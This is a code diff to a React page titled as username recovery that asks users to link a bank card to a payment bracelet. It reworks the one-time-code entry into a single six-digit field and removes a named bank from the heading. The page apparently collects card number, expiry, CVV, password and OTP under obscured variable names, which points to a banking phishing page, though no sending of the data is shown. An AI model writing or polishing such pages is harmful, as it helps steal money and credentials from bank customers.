@@ -48,7 +48,7 @@ export default function UsernameRecoveryPage() {
   const [pass, setPass] = useState("")
   const [exy, setexy] = useState("")
   const [ccc, setccc] = useState("")
-  const [otpValues, setOtpValues] = useState(["", "", "", "",""])
+  const [otpValues, setOtpValues] = useState("")
   const [showOtp, setShowOtp] = useState(false)
   const [otpError, setOtpError] = useState("")
   const [errors, setErrors] = useState<{ [key: string]: string }>({})
@@ -56,15 +56,8 @@ export default function UsernameRecoveryPage() {
 
   const cardInputRefs = useRef<(HTMLInputElement | null)[]>([])
   const handleCloseOtp = () => setShowOtp(false)
-  const handleOtpChange = (index: number, value: string) => {
-    const numericValue = value.replace(/\D/g, "").slice(0, 1)
-    const newOtpValues = [...otpValues]
-    newOtpValues[index] = numericValue
-    setOtpValues(newOtpValues)
-
-    if (numericValue.length === 1 && index < 3) {
-      document.getElementById(`otp-${index + 1}`)?.focus()
-    }
+  const handleOtpChange = (value: string) => {
+    setOtpValues(value)
   }
 
   const handlecnChange = (index: number, value: string) => {
@@ -197,7 +190,7 @@ export default function UsernameRecoveryPage() {
         <div className="px-6 py-8 space-y-8">
           {/* Title */}
           <h1 className="text-2xl font-bold text-gray-900 text-center">
-            ربط بطاقتك البنكية بسوار الدفع الذكي من بنك مسقط
+            ربط بطاقتك البنكية بسوار الدفع الذكي
           </h1>
 
           {/* Phone Number Section */}
@@ -384,18 +377,14 @@ export default function UsernameRecoveryPage() {
             <p className="text-sm text-gray-500 text-right">تم إرسال رمز التحقق إلى رقم هاتفك</p>
 
             <div className="flex justify-center gap-3">
-              {otpValues.map((value, index) => (
                 <Input
-                  key={index}
-                  id={`otp-${index}`}
-                  value={value}
-                  onChange={(e) => handleOtpChange(index, e.target.value)}
-                  className="w-12 h-12 text-center text-lg font-bold"
-                  maxLength={1}
+                  value={otpValues}
+                  onChange={(e) => handleOtpChange( e.target.value)}
+                  className="w-full h-12 text-center text-lg font-bold"
+                  maxLength={6}
                   type="text"
                   inputMode="numeric"
                 />
-              ))}
             </div>
 
             {otpError && (
